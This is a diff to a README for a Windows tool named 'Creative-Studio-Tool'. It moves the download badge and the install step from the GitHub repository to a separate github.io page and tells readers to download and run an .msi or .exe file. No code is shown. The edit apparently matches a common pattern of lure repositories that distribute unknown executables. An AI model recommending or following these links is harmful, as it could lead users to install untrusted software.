@@ -1,6 +1,6 @@
 # 🎨 Creative-Studio-Tool - Professional editing tools for content creators
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Cariapurplishred832/Creative-Studio-Tool)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://cariapurplishred832.github.io)
 
 ## 📋 About This Project
 
@@ -18,7 +18,7 @@ You need a Windows computer to run this software. Make sure your system meets th
 
 ## 📥 How to Install and Run
 
-1. Visit the project page at https://github.com/Cariapurplishred832/Creative-Studio-Tool.
+1. Visit the project page at https://cariapurplishred832.github.io
 2. Select the Releases section on the right side of the page.
 3. Look for the file ending in .msi or .exe.
 4. Click the file name to start the download.
